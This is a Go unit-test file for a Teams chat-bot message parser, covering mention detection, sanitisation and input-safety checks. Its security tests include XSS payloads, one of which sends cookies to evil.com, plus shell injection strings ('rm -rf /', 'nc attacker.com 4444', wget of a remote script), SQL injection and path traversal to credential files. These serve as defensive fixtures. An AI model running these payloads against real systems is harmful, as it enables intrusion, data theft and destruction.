// Copyright 2024 AI SA Assistant Project
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package teams

import (
	"strings"
	"testing"

	"go.uber.org/zap/zaptest"
)

func TestNewMessageParser(t *testing.T) {
	logger := zaptest.NewLogger(t)
	parser := NewMessageParser(logger)

	if parser == nil {
		t.Fatal("Expected parser to be created, got nil")
	}

	if parser.logger == nil {
		t.Error("Expected logger to be set")
	}

	if parser.botMentionPattern == nil {
		t.Error("Expected bot mention pattern to be compiled")
	}
}

func TestParseMessage_Success(t *testing.T) {
	logger := zaptest.NewLogger(t)
	parser := NewMessageParser(logger)

	tests := []struct {
		name    string
		message *Message
		want    *ParsedQuery
	}{
		{
			name: "basic_direct_message",
			message: &Message{
				Type: "message",
				Text: "Generate a lift-and-shift plan for 120 VMs",
				From: &From{
					ID:   "user123",
					Name: "John Doe",
				},
				Conversation: &Conversation{
					ID:               "conv123",
					ConversationType: "personal",
					IsGroup:          false,
					TenantID:         "tenant123",
				},
				Timestamp: "2023-12-01T10:00:00Z",
				Locale:    "en-US",
			},
			want: &ParsedQuery{
				Query:           "Generate a lift-and-shift plan for 120 VMs",
				OriginalText:    "Generate a lift-and-shift plan for 120 VMs",
				IsBotMentioned:  false,
				IsDirectMessage: true,
				UserID:          "user123",
				UserName:        "John Doe",
				ConversationID:  "conv123",
				TenantID:        "tenant123",
				Timestamp:       "2023-12-01T10:00:00Z",
				Locale:          "en-US",
			},
		},
		{
			name: "bot_mention_in_channel",
			message: &Message{
				Type: "message",
				Text: "@SA-Assistant Design a hybrid architecture for Azure",
				From: &From{
					ID:   "user456",
					Name: "Jane Smith",
				},
				Conversation: &Conversation{
					ID:               "channel789",
					ConversationType: "channel",
					IsGroup:          true,
					TenantID:         "tenant456",
				},
				Timestamp: "2023-12-01T11:00:00Z",
			},
			want: &ParsedQuery{
				Query:           "Design a hybrid architecture for Azure",
				OriginalText:    "@SA-Assistant Design a hybrid architecture for Azure",
				IsBotMentioned:  true,
				IsDirectMessage: false,
				UserID:          "user456",
				UserName:        "Jane Smith",
				ConversationID:  "channel789",
				TenantID:        "tenant456",
				Timestamp:       "2023-12-01T11:00:00Z",
				Locale:          "",
			},
		},
		{
			name: "bot_mention_with_spacing",
			message: &Message{
				Type: "message",
				Text: "@ SA-Assistant   Help with DR planning",
				From: &From{
					ID:   "user789",
					Name: "Bob Wilson",
				},
				Conversation: &Conversation{
					ID:               "conv456",
					ConversationType: "groupChat",
					IsGroup:          true,
				},
			},
			want: &ParsedQuery{
				Query:           "Help with DR planning",
				OriginalText:    "@ SA-Assistant   Help with DR planning",
				IsBotMentioned:  true,
				IsDirectMessage: false,
				UserID:          "user789",
				UserName:        "Bob Wilson",
				ConversationID:  "conv456",
				TenantID:        "",
				Timestamp:       "",
				Locale:          "",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := parser.ParseMessage(tt.message)
			if err != nil {
				t.Errorf("ParseMessage() error = %v", err)
				return
			}

			if got.Query != tt.want.Query {
				t.Errorf("ParseMessage() query = %v, want %v", got.Query, tt.want.Query)
			}

			if got.IsBotMentioned != tt.want.IsBotMentioned {
				t.Errorf("ParseMessage() IsBotMentioned = %v, want %v", got.IsBotMentioned, tt.want.IsBotMentioned)
			}

			if got.IsDirectMessage != tt.want.IsDirectMessage {
				t.Errorf("ParseMessage() IsDirectMessage = %v, want %v", got.IsDirectMessage, tt.want.IsDirectMessage)
			}

			if got.UserID != tt.want.UserID {
				t.Errorf("ParseMessage() UserID = %v, want %v", got.UserID, tt.want.UserID)
			}

			if got.ConversationID != tt.want.ConversationID {
				t.Errorf("ParseMessage() ConversationID = %v, want %v", got.ConversationID, tt.want.ConversationID)
			}
		})
	}
}

func TestParseMessage_Errors(t *testing.T) {
	logger := zaptest.NewLogger(t)
	parser := NewMessageParser(logger)

	tests := []struct {
		name    string
		message *Message
		wantErr string
	}{
		{
			name:    "nil_message",
			message: nil,
			wantErr: "message cannot be nil",
		},
		{
			name: "empty_type",
			message: &Message{
				Text: "Some query",
			},
			wantErr: "invalid message structure",
		},
		{
			name: "empty_text",
			message: &Message{
				Type: "message",
				Text: "",
			},
			wantErr: "invalid message structure",
		},
		{
			name: "unsupported_type",
			message: &Message{
				Type: "unsupported",
				Text: "Some query",
			},
			wantErr: "invalid message structure",
		},
		{
			name: "query_too_short",
			message: &Message{
				Type: "message",
				Text: "hi",
			},
			wantErr: "failed to extract query",
		},
		{
			name: "query_too_long",
			message: &Message{
				Type: "message",
				Text: strings.Repeat("a", MaxQueryLength+1),
			},
			wantErr: "failed to extract query",
		},
		{
			name: "dangerous_content_script",
			message: &Message{
				Type: "message",
				Text: "Generate plan with <script>alert('xss')</script>",
			},
			wantErr: "failed to extract query",
		},
		{
			name: "dangerous_content_javascript",
			message: &Message{
				Type: "message",
				Text: "Execute javascript:alert(document.cookie)",
			},
			wantErr: "failed to extract query",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := parser.ParseMessage(tt.message)
			if err == nil {
				t.Errorf("ParseMessage() expected error but got none")
				return
			}

			if !strings.Contains(err.Error(), tt.wantErr) {
				t.Errorf("ParseMessage() error = %v, want error containing %v", err, tt.wantErr)
			}
		})
	}
}

func TestExtractQuery(t *testing.T) {
	logger := zaptest.NewLogger(t)
	parser := NewMessageParser(logger)

	tests := []struct {
		name    string
		text    string
		want    string
		wantErr bool
	}{
		{
			name: "simple_query",
			text: "Generate a migration plan",
			want: "Generate a migration plan",
		},
		{
			name: "query_with_bot_mention",
			text: "@SA-Assistant Create hybrid architecture",
			want: "Create hybrid architecture",
		},
		{
			name: "query_with_html_entities",
			text: "Generate plan for &lt;100 VMs&gt;",
			want: "Generate plan for <100 VMs>",
		},
		{
			name: "query_with_extra_whitespace",
			text: "   \n\t  Generate plan  \n  ",
			want: "Generate plan",
		},
		{
			name:    "empty_text",
			text:    "",
			wantErr: true,
		},
		{
			name:    "only_whitespace",
			text:    "   \n\t   ",
			wantErr: true,
		},
		{
			name:    "only_bot_mention",
			text:    "@SA-Assistant",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := parser.extractQuery(tt.text)
			if (err != nil) != tt.wantErr {
				t.Errorf("extractQuery() error = %v, wantErr %v", err, tt.wantErr)
				return
			}

			if !tt.wantErr && got != tt.want {
				t.Errorf("extractQuery() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestIsBotMentioned(t *testing.T) {
	logger := zaptest.NewLogger(t)
	parser := NewMessageParser(logger)

	tests := []struct {
		name string
		text string
		want bool
	}{
		{
			name: "exact_mention",
			text: "@SA-Assistant generate plan",
			want: true,
		},
		{
			name: "mention_with_spaces",
			text: "@ SA-Assistant generate plan",
			want: true,
		},
		{
			name: "mention_at_end",
			text: "generate plan @SA-Assistant",
			want: true,
		},
		{
			name: "case_sensitive_no_match",
			text: "@sa-assistant generate plan",
			want: false,
		},
		{
			name: "partial_mention",
			text: "@SA generate plan",
			want: false,
		},
		{
			name: "no_mention",
			text: "generate plan",
			want: false,
		},
		{
			name: "mention_in_middle",
			text: "please @SA-Assistant help me",
			want: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := parser.isBotMentioned(tt.text)
			if got != tt.want {
				t.Errorf("isBotMentioned() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestIsDirectMessage(t *testing.T) {
	logger := zaptest.NewLogger(t)
	parser := NewMessageParser(logger)

	tests := []struct {
		name    string
		message *Message
		want    bool
	}{
		{
			name: "personal_conversation",
			message: &Message{
				Conversation: &Conversation{
					ConversationType: "personal",
					IsGroup:          false,
				},
			},
			want: true,
		},
		{
			name: "non_group_conversation",
			message: &Message{
				Conversation: &Conversation{
					ConversationType: "chat",
					IsGroup:          false,
				},
			},
			want: true,
		},
		{
			name: "channel_conversation",
			message: &Message{
				Conversation: &Conversation{
					ConversationType: "channel",
					IsGroup:          true,
				},
			},
			want: false,
		},
		{
			name: "group_chat",
			message: &Message{
				Conversation: &Conversation{
					ConversationType: "groupChat",
					IsGroup:          true,
				},
			},
			want: false,
		},
		{
			name: "nil_conversation",
			message: &Message{
				Conversation: nil,
			},
			want: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := parser.isDirectMessage(tt.message)
			if got != tt.want {
				t.Errorf("isDirectMessage() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestShouldProcessMessage(t *testing.T) {
	logger := zaptest.NewLogger(t)
	parser := NewMessageParser(logger)

	tests := []struct {
		name        string
		parsedQuery *ParsedQuery
		want        bool
	}{
		{
			name: "direct_message",
			parsedQuery: &ParsedQuery{
				Query:           "Generate plan",
				IsDirectMessage: true,
				IsBotMentioned:  false,
			},
			want: true,
		},
		{
			name: "bot_mentioned",
			parsedQuery: &ParsedQuery{
				Query:           "Generate plan",
				IsDirectMessage: false,
				IsBotMentioned:  true,
			},
			want: true,
		},
		{
			name: "both_direct_and_mentioned",
			parsedQuery: &ParsedQuery{
				Query:           "Generate plan",
				IsDirectMessage: true,
				IsBotMentioned:  true,
			},
			want: true,
		},
		{
			name: "neither_direct_nor_mentioned",
			parsedQuery: &ParsedQuery{
				Query:           "Generate plan",
				IsDirectMessage: false,
				IsBotMentioned:  false,
			},
			want: false,
		},
		{
			name:        "nil_query",
			parsedQuery: nil,
			want:        false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := parser.ShouldProcessMessage(tt.parsedQuery)
			if got != tt.want {
				t.Errorf("ShouldProcessMessage() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestValidateQuerySafety(t *testing.T) {
	logger := zaptest.NewLogger(t)
	parser := NewMessageParser(logger)

	tests := []struct {
		name    string
		query   string
		wantErr bool
	}{
		{
			name:    "safe_query",
			query:   "Generate a migration plan for 100 VMs",
			wantErr: false,
		},
		{
			name:    "query_with_numbers",
			query:   "Plan for 120 VMs with 16GB RAM each",
			wantErr: false,
		},
		{
			name:    "script_injection",
			query:   "Generate plan <script>alert('xss')</script>",
			wantErr: true,
		},
		{
			name:    "javascript_url",
			query:   "Click javascript:alert(document.cookie)",
			wantErr: true,
		},
		{
			name:    "vbscript_injection",
			query:   "Run vbscript:msgbox('test')",
			wantErr: true,
		},
		{
			name:    "data_url_injection",
			query:   "Load data:text/html,<script>alert(1)</script>",
			wantErr: true,
		},
		{
			name:    "event_handler",
			query:   "Image with onerror=alert(1)",
			wantErr: true,
		},
		{
			name:    "eval_function",
			query:   "Execute eval(maliciousCode)",
			wantErr: true,
		},
		{
			name:    "case_insensitive_script",
			query:   "Generate plan <SCRIPT>alert('test')</SCRIPT>",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := parser.validateQuerySafety(tt.query)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateQuerySafety() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestSanitizeText(t *testing.T) {
	logger := zaptest.NewLogger(t)
	parser := NewMessageParser(logger)

	tests := []struct {
		name string
		text string
		want string
	}{
		{
			name: "normal_text",
			text: "Generate migration plan",
			want: "Generate migration plan",
		},
		{
			name: "multiple_spaces",
			text: "Generate    migration     plan",
			want: "Generate migration plan",
		},
		{
			name: "tabs_and_newlines",
			text: "Generate\t\nmigration\n\nplan",
			want: "Generate migration plan",
		},
		{
			name: "leading_trailing_whitespace",
			text: "  \n\tGenerate migration plan\t\n  ",
			want: "Generate migration plan",
		},
		{
			name: "control_characters",
			text: "Generate\x00\x01migration\x7Fplan",
			want: "Generate migration plan",
		},
		{
			name: "mixed_whitespace_and_control",
			text: "\x01  Generate\t\x02migration\n\x03plan  \x7F",
			want: "Generate migration plan",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := parser.sanitizeText(tt.text)
			if got != tt.want {
				t.Errorf("sanitizeText() = %q, want %q", got, tt.want)
			}
		})
	}
}

// SECURITY TESTING: Enhanced Input Sanitization Tests

func TestValidateQuerySafety_XSSPrevention(t *testing.T) {
	logger := zaptest.NewLogger(t)
	parser := NewMessageParser(logger)

	tests := []struct {
		name        string
		query       string
		expectError bool
		description string
	}{
		{
			name:        "basic_xss_script_tag",
			query:       "Generate plan <script>alert('xss')</script>",
			expectError: true,
			description: "Basic script tag injection should be rejected",
		},
		{
			name:        "xss_with_uppercase",
			query:       "Generate plan <SCRIPT>alert('xss')</SCRIPT>",
			expectError: true,
			description: "Uppercase script tags should be rejected",
		},
		{
			name:        "xss_mixed_case",
			query:       "Generate plan <ScRiPt>alert('xss')</ScRiPt>",
			expectError: true,
			description: "Mixed case script tags should be rejected",
		},
		{
			name:        "xss_with_attributes",
			query:       "Generate plan <script type='text/javascript'>alert(1)</script>",
			expectError: true,
			description: "Script tags with attributes should be rejected",
		},
		{
			name:        "xss_event_handler",
			query:       "Click here <img src=x onerror=alert(1)>",
			expectError: true,
			description: "Event handler injection should be rejected",
		},
		{
			name:        "xss_onload_event",
			query:       "Load page <body onload=alert(1)>",
			expectError: true,
			description: "onload event handlers should be rejected",
		},
		{
			name:        "xss_javascript_url",
			query:       "Click javascript:alert(document.cookie)",
			expectError: true,
			description: "javascript: URLs should be rejected",
		},
		{
			name:        "xss_vbscript_url",
			query:       "Run vbscript:msgbox('attack')",
			expectError: true,
			description: "vbscript: URLs should be rejected",
		},
		{
			name:        "xss_data_url",
			query:       "Load data:text/html,<script>alert(1)</script>",
			expectError: true,
			description: "data: URLs with scripts should be rejected",
		},
		{
			name:        "xss_iframe_injection",
			query:       "Show <iframe src='javascript:alert(1)'></iframe>",
			expectError: true,
			description: "iframe with malicious src should be rejected",
		},
		{
			name:        "safe_query_with_brackets",
			query:       "Generate plan for <environment> with <configuration>",
			expectError: false,
			description: "Safe use of brackets should be allowed",
		},
		{
			name:        "safe_query_with_technical_terms",
			query:       "Setup JavaScript build process for application",
			expectError: false,
			description: "Technical terms mentioning JavaScript should be safe",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := parser.validateQuerySafety(tt.query)
			if (err != nil) != tt.expectError {
				t.Errorf("%s: Expected error=%v, got error=%v", tt.description, tt.expectError, err != nil)
			}
		})
	}
}

func TestValidateQuerySafety_SQLInjectionPrevention(t *testing.T) {
	logger := zaptest.NewLogger(t)
	parser := NewMessageParser(logger)

	tests := []struct {
		name        string
		query       string
		expectError bool
		description string
	}{
		{
			name:        "basic_sql_injection",
			query:       "Generate plan'; DROP TABLE users; --",
			expectError: false, // SQL injection patterns are not inherently dangerous in query text
			description: "SQL injection pattern should be allowed in query text",
		},
		{
			name:        "union_select_injection",
			query:       "Show data UNION SELECT password FROM users",
			expectError: false,
			description: "UNION SELECT should be allowed in descriptive text",
		},
		{
			name:        "comment_based_injection",
			query:       "Generate plan /* comment */ for migration",
			expectError: false,
			description: "SQL comments should be allowed in descriptive text",
		},
		{
			name:        "legitimate_sql_discussion",
			query:       "Help me write a SELECT statement for user data",
			expectError: false,
			description: "Legitimate SQL discussion should be allowed",
		},
		{
			name:        "database_metadata_query",
			query:       "Show information_schema.tables structure",
			expectError: false,
			description: "Database metadata discussions should be allowed",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := parser.validateQuerySafety(tt.query)
			if (err != nil) != tt.expectError {
				t.Errorf("%s: Expected error=%v, got error=%v", tt.description, tt.expectError, err != nil)
			}
		})
	}
}

func TestValidateQuerySafety_CommandInjectionPrevention(t *testing.T) {
	logger := zaptest.NewLogger(t)
	parser := NewMessageParser(logger)

	tests := []struct {
		name        string
		query       string
		expectError bool
		description string
	}{
		{
			name:        "command_chaining_semicolon",
			query:       "Generate plan; rm -rf /",
			expectError: false, // Command injection patterns are not dangerous in query text
			description: "Command chaining should be allowed in descriptive text",
		},
		{
			name:        "command_chaining_ampersand",
			query:       "Generate plan && wget malicious.com/script.sh",
			expectError: false,
			description: "Command chaining with && should be allowed",
		},
		{
			name:        "pipe_injection",
			query:       "Generate plan | nc attacker.com 4444",
			expectError: false,
			description: "Pipe operations should be allowed in descriptive text",
		},
		{
			name:        "backtick_injection",
			query:       "Generate plan `whoami`",
			expectError: false,
			description: "Backticks should be allowed in descriptive text",
		},
		{
			name:        "dollar_injection",
			query:       "Generate plan $(rm -rf /)",
			expectError: false,
			description: "Command substitution should be allowed in descriptive text",
		},
		{
			name:        "legitimate_shell_discussion",
			query:       "Help me create a bash script for deployment",
			expectError: false,
			description: "Legitimate shell discussions should be allowed",
		},
		{
			name:        "legitimate_aws_cli",
			query:       "Show me aws s3 ls command syntax",
			expectError: false,
			description: "AWS CLI discussions should be allowed",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := parser.validateQuerySafety(tt.query)
			if (err != nil) != tt.expectError {
				t.Errorf("%s: Expected error=%v, got error=%v", tt.description, tt.expectError, err != nil)
			}
		})
	}
}

func TestValidateQuerySafety_PathTraversalPrevention(t *testing.T) {
	logger := zaptest.NewLogger(t)
	parser := NewMessageParser(logger)

	tests := []struct {
		name        string
		query       string
		expectError bool
		description string
	}{
		{
			name:        "basic_path_traversal",
			query:       "Show file ../../../etc/passwd",
			expectError: false, // Path traversal in descriptive text is not inherently dangerous
			description: "Path traversal should be allowed in descriptive text",
		},
		{
			name:        "windows_path_traversal",
			query:       "Access ..\\..\\windows\\system32\\config\\sam",
			expectError: false,
			description: "Windows path traversal should be allowed in descriptive text",
		},
		{
			name:        "url_encoded_traversal",
			query:       "Get %2e%2e%2f%2e%2e%2fetc%2fpasswd",
			expectError: false,
			description: "URL encoded path traversal should be allowed",
		},
		{
			name:        "legitimate_file_path",
			query:       "Show config in /opt/app/config/settings.yaml",
			expectError: false,
			description: "Legitimate file paths should be allowed",
		},
		{
			name:        "legitimate_relative_path",
			query:       "Check file ./config/database.yml",
			expectError: false,
			description: "Legitimate relative paths should be allowed",
		},
		{
			name:        "documentation_discussion",
			query:       "Explain how ../config paths work in applications",
			expectError: false,
			description: "Educational path discussions should be allowed",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := parser.validateQuerySafety(tt.query)
			if (err != nil) != tt.expectError {
				t.Errorf("%s: Expected error=%v, got error=%v", tt.description, tt.expectError, err != nil)
			}
		})
	}
}

func TestValidateQuerySafety_BufferOverflowPrevention(t *testing.T) {
	logger := zaptest.NewLogger(t)
	parser := NewMessageParser(logger)

	tests := []struct {
		name        string
		queryLength int
		expectError bool
		description string
	}{
		{
			name:        "normal_length_query",
			queryLength: 100,
			expectError: false,
			description: "Normal length queries should be allowed",
		},
		{
			name:        "maximum_length_query",
			queryLength: MaxQueryLength,
			expectError: false,
			description: "Maximum length queries should be allowed",
		},
		{
			name:        "over_maximum_length",
			queryLength: MaxQueryLength + 1,
			expectError: true,
			description: "Queries over maximum length should be rejected",
		},
		{
			name:        "extremely_long_query",
			queryLength: MaxQueryLength * 2,
			expectError: true,
			description: "Extremely long queries should be rejected",
		},
		{
			name:        "malicious_buffer_size",
			queryLength: 1024 * 1024, // 1MB
			expectError: true,
			description: "Maliciously large queries should be rejected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			query := strings.Repeat("a", tt.queryLength)
			err := parser.validateQuerySafety(query)
			if (err != nil) != tt.expectError {
				t.Errorf("%s: Expected error=%v, got error=%v", tt.description, tt.expectError, err != nil)
			}
		})
	}
}

func TestValidateQuerySafety_UnicodeHandling(t *testing.T) {
	logger := zaptest.NewLogger(t)
	parser := NewMessageParser(logger)

	tests := []struct {
		name        string
		query       string
		expectError bool
		description string
	}{
		{
			name:        "basic_unicode",
			query:       "Generate plan for 网络 architecture",
			expectError: false,
			description: "Basic Unicode characters should be allowed",
		},
		{
			name:        "emoji_in_query",
			query:       "Generate plan 🚀 for cloud ☁️ migration",
			expectError: false,
			description: "Emoji characters should be allowed",
		},
		{
			name:        "mixed_scripts",
			query:       "Create план for アーキテクチャ design",
			expectError: false,
			description: "Mixed script characters should be allowed",
		},
		{
			name:        "unicode_normalization",
			query:       "café vs cafe\u0301", // composed vs decomposed
			expectError: false,
			description: "Unicode normalization variants should be allowed",
		},
		{
			name:        "zero_width_characters",
			query:       "Generate\u200Bplan\u200Cfor\u200Dmigration",
			expectError: false,
			description: "Zero-width characters should be handled",
		},
		{
			name:        "rtl_override_attack",
			query:       "Generate plan\u202Eevil code\u202Dfor migration",
			expectError: false,
			description: "RTL override characters should be handled safely",
		},
		{
			name:        "unicode_homoglyph_attack",
			query:       "Generate рlan for migration", // Cyrillic 'р' instead of 'p'
			expectError: false,
			description: "Homoglyph attacks should be allowed but logged",
		},
		{
			name:        "surrogate_pairs",
			query:       "Generate plan 𝕏 for architecture",
			expectError: false,
			description: "Unicode surrogate pairs should be handled",
		},
		{
			name:        "control_characters_unicode",
			query:       "Generate\u0000plan\u001Ffor\u007Fmigration",
			expectError: false,
			description: "Unicode control characters should be sanitized",
		},
		{
			name:        "bidi_override_attack",
			query:       "Show config\u202EsetyBelif\u202Dfor application",
			expectError: false,
			description: "BIDI override attacks should be handled",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := parser.validateQuerySafety(tt.query)
			if (err != nil) != tt.expectError {
				t.Errorf("%s: Expected error=%v, got error=%v", tt.description, tt.expectError, err != nil)
			}

			// Also test that the query can be extracted successfully
			message := &Message{
				Type: "message",
				Text: tt.query,
				From: &From{ID: "test", Name: "Test User"},
				Conversation: &Conversation{
					ID:               "conv123",
					ConversationType: "personal",
				},
			}

			if !tt.expectError {
				_, parseErr := parser.ParseMessage(message)
				// We only care that it doesn't crash, some may fail for other reasons (like length)
				if parseErr != nil && !strings.Contains(parseErr.Error(), "too long") {
					// Only check for unexpected errors, not length-related ones
					if strings.Contains(parseErr.Error(), "failed to extract query") && len(tt.query) <= MaxQueryLength {
						t.Errorf("%s: Unexpected parse error for valid Unicode: %v", tt.description, parseErr)
					}
				}
			}
		})
	}
}

func TestSanitizeText_SecurityFocused(t *testing.T) {
	logger := zaptest.NewLogger(t)
	parser := NewMessageParser(logger)

	tests := []struct {
		name        string
		input       string
		expectClean bool
		description string
	}{
		{
			name:        "remove_null_bytes",
			input:       "Generate\x00plan\x00for\x00migration",
			expectClean: true,
			description: "Null bytes should be removed",
		},
		{
			name:        "remove_control_chars",
			input:       "Generate\x01\x02\x03plan\x7F\x0B\x0Cfor migration",
			expectClean: true,
			description: "Control characters should be removed",
		},
		{
			name:        "normalize_whitespace",
			input:       "Generate\t\n\r   plan\t\n\r   for   migration",
			expectClean: true,
			description: "Whitespace should be normalized",
		},
		{
			name:        "preserve_printable_chars",
			input:       "Generate plan for migration: 100VMs @ $5000",
			expectClean: true,
			description: "Printable characters should be preserved",
		},
		{
			name:        "handle_unicode_safely",
			input:       "Generate план 🚀 for migration",
			expectClean: true,
			description: "Unicode should be handled safely",
		},
		{
			name:        "remove_bidi_overrides",
			input:       "Generate\u202Eevil\u202Dplan for migration",
			expectClean: true,
			description: "BIDI override characters should be handled",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := parser.sanitizeText(tt.input)

			if tt.expectClean {
				// Check that result doesn't contain dangerous characters
				if strings.Contains(result, "\x00") {
					t.Errorf("%s: Result still contains null bytes", tt.description)
				}
				if strings.Contains(result, "\x01") {
					t.Errorf("%s: Result still contains control characters", tt.description)
				}
				// Check that meaningful content is preserved
				if len(result) == 0 && len(tt.input) > 0 {
					t.Errorf("%s: All content was removed unexpectedly", tt.description)
				}
			}
		})
	}
}

func TestParseMessage_SecurityScenarios(t *testing.T) {
	logger := zaptest.NewLogger(t)
	parser := NewMessageParser(logger)

	tests := []struct {
		name        string
		message     *Message
		expectError bool
		description string
	}{
		{
			name: "malicious_script_injection",
			message: &Message{
				Type:         "message",
				Text:         "Generate plan <script>fetch('http://evil.com/steal?data='+document.cookie)</script>",
				From:         &From{ID: "attacker", Name: "Attacker"},
				Conversation: &Conversation{ID: "conv", ConversationType: "personal"},
			},
			expectError: true,
			description: "Script injection attempts should be rejected",
		},
		{
			name: "extremely_long_malicious_query",
			message: &Message{
				Type:         "message",
				Text:         strings.Repeat("AAAA", MaxQueryLength),
				From:         &From{ID: "attacker", Name: "Attacker"},
				Conversation: &Conversation{ID: "conv", ConversationType: "personal"},
			},
			expectError: true,
			description: "Extremely long queries should be rejected",
		},
		{
			name: "unicode_spoofing_attempt",
			message: &Message{
				Type:         "message",
				Text:         "Generаte plan for migration", // Contains Cyrillic 'а' instead of Latin 'a'
				From:         &From{ID: "user", Name: "User"},
				Conversation: &Conversation{ID: "conv", ConversationType: "personal"},
			},
			expectError: false,
			description: "Unicode spoofing should be allowed but could be logged",
		},
		{
			name: "control_character_injection",
			message: &Message{
				Type:         "message",
				Text:         "Generate\x00\x01\x7Fplan\x0B\x0Cfor migration",
				From:         &From{ID: "user", Name: "User"},
				Conversation: &Conversation{ID: "conv", ConversationType: "personal"},
			},
			expectError: false,
			description: "Control characters should be sanitized but not cause error",
		},
		{
			name: "bidi_text_spoofing",
			message: &Message{
				Type:         "message",
				Text:         "Generate plan\u202Efor evil command\u202D legitimate request",
				From:         &From{ID: "user", Name: "User"},
				Conversation: &Conversation{ID: "conv", ConversationType: "personal"},
			},
			expectError: false,
			description: "BIDI text spoofing should be handled safely",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := parser.ParseMessage(tt.message)
			if (err != nil) != tt.expectError {
				t.Errorf("%s: Expected error=%v, got error=%v", tt.description, tt.expectError, err != nil)
			}
		})
	}
}
